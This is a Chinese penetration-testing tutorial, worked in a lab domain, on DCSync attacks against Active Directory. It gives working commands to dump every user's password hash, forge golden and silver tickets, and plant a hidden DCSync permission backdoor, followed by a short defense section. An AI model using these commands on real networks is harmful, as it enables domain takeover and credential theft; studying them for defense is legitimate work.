![20210825125600.png](https://image.3001.net/images/20210825/1629868792_6125d2f8ae6ced9949a7c.png!small)

## DCSync 是什么

在域环境中，不同域控制器（DC）之间，每 15 分钟都会有一次域数据的同步。当一个域控制器（DC 1）想从其他域控制器（DC 2）获取数据时，DC 1 会向
DC 2 发起一个 GetNCChanges 请求，该请求的数据包括需要同步的数据。如果需要同步的数据比较多，则会重复上述过程。DCSync
就是利用的这个原理，通过 Directory Replication Service（DRS） 服务的 GetNCChanges
接口向域控发起数据同步请求。

DCSync 是域渗透中经常会用到的技术，其被整合在了 Mimikatz 中。在 DCSync
功能出现之前，要想获得域用户的哈希，需要登录域控制器，在域控制器上执行代码才能获得域用户的哈希。

2015 年 8 月，Benjamin Delpy（神器 Mimikatz 的作者）和 Vincent Le Toux 发布了新版本的
Mimikatz，新增加了 DCSync
功能。该功能可以模仿一个域控制器，从真实的域控制器中请求数据，例如用户的哈希。该功能最大的特点就是不用登陆域控制器，即可远程通过域数据同步复制的方式获得域控制器上的的数据。

> 注意：DCSync 攻击的对象如果是只读域控制器 (RODC)，则会失效，因为 RODC 是不能参与复制同步数据到其他 DC 的。

在默认情况下，只有 Administrators、Domain Controllers 和 Enterprise Domain Admins
组内的用户有权限使用 DCSync，但我们可以对域内普通用户添加 ACL (Access Control List) 实现普通用户也能调用 DCSync
功能。

## 利用 DCSync 导出域内哈希

当我们获取相应的权限后，可以利用 DCSync 功能导出域内用户的哈希值。其原理就是利用 DRS （Directory Replication
Service）协议通过 IDL_DRSGetNCChanges 从域控制器复制用户哈希凭据。获得了域内用户的哈希后可以进一步利用。

### 通过 Mimikatz

在获取权限的域成员主机上执行如下：

    
    
    # 导出域内指定用户的信息(包括哈希值)  
    lsadump::dcsync /domain:whoamianony.org /user:administrator   
    lsadump::dcsync /domain:whoamianony.org /user:administrator /csv  
      
    # 导出域内所有用户的信息(包括哈希值)  
    lsadump::dcsync /domain:whoamianony.org /all      
    lsadump::dcsync /domain:whoamianony.org /all /csv

![image-20210824183902976](https://image.3001.net/images/20210825/1629868793_6125d2f91e61b3e8cf8f9.png!small)

如上图所示，成功获取 Administrator 用户的 NTLM 哈希。

### 通过 Secretsdump.py

项目地址：<https://github.com/SecureAuthCorp/impacket/tree/impacket_0_9_22>

Secretsdump.py 是 Impacket 框架中的一个脚本，该脚本也可以通过 DCSync
技术导出域控制器上用户的哈希。该工具的原理是首先使用提供的用户登录凭据通过 smbexec 或者 wmiexec
远程连接至域控制器并获得高权限，进而从注册表中导出本地帐户的哈希，同时通过 Dcsync 或从 NTDS.dit
文件中导出所有域用户的哈希。其最大的优点是支持从域外的计算机连接至域控制器。

使用方法如下：

    
    
    python3 secretsdump.py whoamianony/administrator:Whoami2021@192.168.93.30 -dc-ip 192.168.93.30 -just-dc-user administrator    # 获取 administrator 用户的哈希  
    # python3 secretsdump.py domain/<username for DCSync>:password@<dc-ip> -dc-ip <dc-ip> -just-dc-user <username for DCSync>

![image-20210824233919549](https://image.3001.net/images/20210825/1629868793_6125d2f95bcb47ce52c6c.png!small)

    
    
    python3 secretsdump.py whoamianony/administrator:Whoami2021@192.168.93.30    # 获取所有域用户哈希, 包括机器用户

![image-20210825114427329](https://image.3001.net/images/20210825/1629868793_6125d2f9cce0a183f717a.png!small)

### 通过 PowerShell

项目地址：<https://gist.github.com/monoxgas/9d238accd969550136db#file-invoke-dcsync-ps1>

该脚本可以通过 Invoke-ReflectivePEinjection 调用 mimikatz.dll 中的 DCSync 功能

在获取权限的域成员主机上执行如下命令即可：

    
    
    Import-Module .\Invoke-DCSync.ps1  
    ​  
    # 导出域内所有用户的哈希值  
    Invoke-DCSync -DumpForest -Users @("administrator") | ft -wrap -autosize  
    ​  
    # 导出域内指定用户的哈希值  
    Invoke-DCSync -DumpForest | ft -wrap -autosize

## 利用 DCSync 制作黄金票据

在域渗透中，我们可以通过 DCSync 导出域控制器中 krbtgt 账户的哈希，并利用 krbtgt 账户的哈希制作黄金票据。

>
> 黄金票据的详情请看：[《内网渗透测试：Kerberos协议相关安全问题分析与利用》](https://www.freebuf.com/articles/web/274035.html)

测试环境如下：

![image-20210824221346483](https://image.3001.net/images/20210825/1629868798_6125d2fed92ac2f44bbe5.png!small)

假设攻击者已经拿下了内网主机 Windows 10，下面演示如何在内网中利用 DCSync 制作黄金票据来访问 DC 上的资源。

拿下 Windows 10 主机之后，我们加载 kiwi 模块：

    
    
    load kiwi

![image-20210824213230936](https://image.3001.net/images/20210825/1629868799_6125d2ff2586ab6bee17d.png!small)

然后通过`kiwi_cmd`执行 Mimikatz 命令，使用 Mimikatz 的 DCSync 功能导出域控制器中 krbtgt 账户的哈希：

    
    
    kiwi_cmd "lsadump::dcsync /domain:whoamianony.org /user:krbtgt"

![image-20210824214421165](https://image.3001.net/images/20210825/1629868799_6125d2ffc29101932b443.png!small)

然后我们便可以通过 krbtgt 账户的哈希生成黄金票据了：

    
    
    golden_ticket_create -u Administrator -d whoamianony.org -s S-1-5-21-1315137663-3706837544-1429009142 -k 6be58bfcc0a164af2408d1d3bd313c2a -t gold.tck

执行后生成的票据会咱是存放在你的 Kali 上，然后执行以下命令，清空目标主机上的票据：

    
    
    kerberos_ticket_purge

![image-20210824215536411](https://image.3001.net/images/20210825/1629868801_6125d301a3e6915eb3547.png!small)

最后使用`kerberos_ticket_use`注入刚才生成的票据即可：

    
    
    kerberos_ticket_use gold.tck

![image-20210824215648481](https://image.3001.net/images/20210825/1629868802_6125d3021cb088f7955cc.png!small)

如上图所示，票据成功注入。此时，攻击者就可以利用 Windows 7 任意访问域控上的资源了：

    
    
    dir \\DC\c$

![image-20210824220003150](https://image.3001.net/images/20210825/1629868802_6125d302b5929d9bf6e6e.png!small)

有了黄金票据之后的操作就简单了，懂得都懂！

## 利用 DCSync 进行域内权限维持

我们前面说了，要想利用 DCSync 功能，得要拥有 Administrators、Domain Controllers 或 Enterprise
Domain Admins 组内的用户权限。但是我们就不能让普通域用户拥有 DCSync 的操作权限吗？当然可以！

当我们获得了域内管理员权限后，我们可以修改域内普通用户的权限，使其具有 DCSync
操作权限，那么普通域用户也能导出域内用户的信息了，这样可以可以做一个隐蔽的后门进行权限维持。具体做法就是为普通域用户添加三条 ACE 访问控制项：

> DS-Replication-Get-Changes（GUID:1131f6aa-9c07-11d1-f79f-00c04fc2dcd2）
>
> DS-Replication-Get-Changes-All（GUID:1131f6ad-9c07-11d1-f79f-00c04fc2dcd2）
>
> DS-Replication-Get-Changes（GUID:89e95b76-444d-4c62-991a-0facbeda640c）

我们可以通过 Empire 框架中的 PowerView.ps1 脚本实现：

    
    
    Import-Module .\powerview.ps1  
    ​  
    # 为域用户 whoami 添加以上三条 ACE  
    Add-DomainObjectAcl -TargetIdentity "DC=whoamianony,DC=org" -PrincipalIdentity whoami -Rights DCSync -Verbose  
      
    # 为域用户 whoami 删除以上三条 ACE  
    Remove-DomainObjectAcl -TargetIdentity "DC=whoamianony,DC=org" -PrincipalIdentity whoami -Rights DCSync -Verbose

![image-20210824231710066](https://image.3001.net/images/20210825/1629868803_6125d303b7794ddc3d0f2.png!small)

此时域用户 whoami 便具有了 DCSync 权限。之后便可以用这个 whoami 用户的权限进行 DCSync 攻击了。

 **我们可以利用 whoami 用户的身份，通过 Secretsdump.py 的 DCSync 功能导出 DC 上的用户哈希。**

    
    
    python3 secretsdump.py whoamianony/whoami:Whoami2021@192.168.93.30 -dc-ip 192.168.93.30 -just-dc-user administrator

![image-20210824232653186](https://image.3001.net/images/20210825/1629868804_6125d3043aa8092eff012.png!small)

 **还可以先使用`runas`实现登录 whoami 用户，然后再使用 DCSync。**

首先执行以下命令弹出一个 whoami 用户登录权限的 CMD：

    
    
    runas /noprofile /user:whoamianony\whoami cmd

然后在弹出的 CMD 中执行 Mimikatz 进行 DCSync 即可：

    
    
    mimikatz.exe privilege::debug "lsadump::dcsync /domain:whoamianony.org /all /csv" exit

![image-20210824235724341](https://image.3001.net/images/20210825/1629868804_6125d304b1e9ed420e13a.png!small)

 **同样，也可以先使用 PowerShell 实现登录 whoami 用户，然后再使用 DCSync。**

首先执行以下命令弹出一个 whoami 用户登录权限的 CMD：

    
    
    $uname="whoamianony\whoami"  
    $pwd=ConvertTo-SecureString "Whoami2021" -AsPlainText –Force  
    $cred=New-Object System.Management.Automation.PSCredential($uname,$pwd)  
    Start-Process -FilePath "cmd.exe" -Credential $cred

然后再弹出的 CMD 中执行 Mimikatz 进行 DCSync 即可：

    
    
    mimikatz.exe privilege::debug "lsadump::dcsync /domain:whoamianony.org /all /csv" exit

## 查询域内具有 DCSync 权限的用户

我们可以使用 Adfind 来查询域内具有 DCSync 权限的用户：

    
    
    AdFind.exe -s subtree -b "DC=whoamianony,DC=org" -sdna nTSecurityDescriptor -sddl+++ -sddlfilter ;;;"Replicating Directory Changes";; -recmute  
    ​  
    AdFind.exe -s subtree -b "DC=whoamianony,DC=org" -sdna nTSecurityDescriptor -sddl+++ -sddlfilter ;;;"DS-Replication-Get-Changes";; -recmute

![image-20210825101308313](https://image.3001.net/images/20210825/1629868805_6125d305a9840a3e16bec.png!small)

## 使用机器账户（MachineAccount）实现 DCSync

MachineAccount
即机器账号、计算机账号，是每台计算机在安装系统后默认生成的帐户。所有加入域的也主机都会有一个机器用户，用户名为机器名加`$`，如：`WIN7$`、`WINXP$`。

计算机帐户的密码存储在注册表中的位置为：

    
    
    HKEY_LOCAL_MACHINE\SECURITY\Policy\Secrets\$machine.ACC  
    # 该注册表键路径只能在 SYSTEM 权限下访问

如果计算机加入域中，会将计算机帐户的密码同步到域控制器并保存在域控制器的 NTDS.dit 活动目录数据库文件中。计算机帐户的密码默认每 30
天自动更新，密码长度为 120 个字符，所以即使我们获得了计算机帐户密码的哈希值，也几乎无法还原出计算机帐户的明文口令。

要使用机器账户实现 DCSync，首先要做的就是获取机器账户身份的权限，然后再利用机器账户的身份进行 DCSync 操作。下面进行具体的演示。

### 首先获取 MachineAccount 的密码哈希

可以直接在域控上使用 Mimikatz 通过注册表文件导出当前计算机帐户的密码哈希。

    
    
    privilege::debug  
    token::elevate  
    lsadump::secrets

![image-20210825120150485](https://image.3001.net/images/20210825/1629868806_6125d306464deaf8ba6ea.png!small)

也可以在域成员主机上利用 DCSync 导出所有计算机帐户的密码哈希。

    
    
    mimikatz.exe "lsadump::dcsync /domain:whoamianony.org /all /csv"

![image-20210825120249611](https://image.3001.net/images/20210825/1629868806_6125d30693712874d672f.png!small)

    
    
    python3 secretsdump.py whoamianony/administrator:Whoami2021@192.168.93.30

![image-20210825115038010](https://image.3001.net/images/20210825/1629868807_6125d3071fb7d0c7eb93c.png!small)

### 然后使用 MachineAccount 进行 DCSync

有了机器账号的密码哈希后，我们需要想办法登录到这个机器账号，由于无法破解哈希，我们可以使用白银票据的方法。

利用方式如下：

    
    
    mimikatz "kerberos::golden /domain:whoamianony.org /sid:S-1-5-21-1315137663-3706837544-1429009142 /target:DC.whoamianony.org /service:LDAP /rc4:8e89dfbe74fcae2e993ea2aa47b6a9c1 /user:krbtgt /ptt" "lsadump::dcsync /domain:whoamianony.org /all /csv" exit

>
> 白银票据的详情请看：[《内网渗透测试：Kerberos协议相关安全问题分析与利用》](https://www.freebuf.com/articles/web/274035.html)

![image-20210825121006293](https://image.3001.net/images/20210825/1629868807_6125d3078da19efa01926.png!small)

![image-20210825121035072](https://image.3001.net/images/20210825/1629868808_6125d30842df744d94d64.png!small)

也可以通过 secretsdump，使用机器账户的哈希从域外的计算机连接至域控制器导出哈希：

    
    
    python3 secretsdump.py -hashes :8e89dfbe74fcae2e993ea2aa47b6a9c1 whoamianony/DC$@192.168.93.30

![image-20210825121201265](https://image.3001.net/images/20210825/1629868808_6125d308af66368f0e3e1.png!small)

注意：如果使用域内普通计算机帐户的密码哈希连接对应的计算机，那么会失败。

## DCSync 的防御

DCSync 攻击的原理是模拟域控制器与域控制器之间的数据同步复制。最好的防御方法是给控制器设置白名单，将可信任的资产设置在允许同步的白名单内。

除此之外，我们还应尝试枚举 Active Directory 中所有用户的 ACL 查询出所有特权帐户，检测域内被添加 DCSync
权限的用户。Github 上有一个项目
[ACLight](https://github.com/cyberark/ACLight)便提供了这样的功能，只需执行项目中的 Execute-ACLight2.bat，便会生成以下三个文件：

> Privileged Accounts - Layers Analysis.txt
>
> Privileged Accounts Permissions - Final Report.csv
>
> Privileged Accounts Permissions - Irregular Accounts.csv

文件中会显示出所有特权帐户。

![image-20210825131248998](https://image.3001.net/images/20210825/1629868811_6125d30becbd91e076f02.png!small)

![image-20210825131342750](https://image.3001.net/images/20210825/1629868812_6125d30cab58ef84e90f7.png!small)

## Ending......

![20210825131744.jpg](https://image.3001.net/images/20210825/1629868813_6125d30d6e13f6cff6643.jpg!small)

## 参考：

> <https://3gstudent.github.io/%E5%9F%9F%E6%B8%97%E9%80%8F-DCSync>
>
> <https://blog.csdn.net/qq_36119192/article/details/108988491>
>
> <https://shu1l.github.io/2020/08/05/dcsync-yu-dcshadow-gong-ji-xue-> xi/#2-powershell%E5%AE%9E%E7%8E%B0>
>
> <https://www.ired.team/offensive-security-experiments/active-directory-> kerberos-abuse/dump-password-hashes-from-domain-controller-with-dcsync>
>
> <https://book.hacktricks.xyz/windows/active-directory-methodology/dcsync>

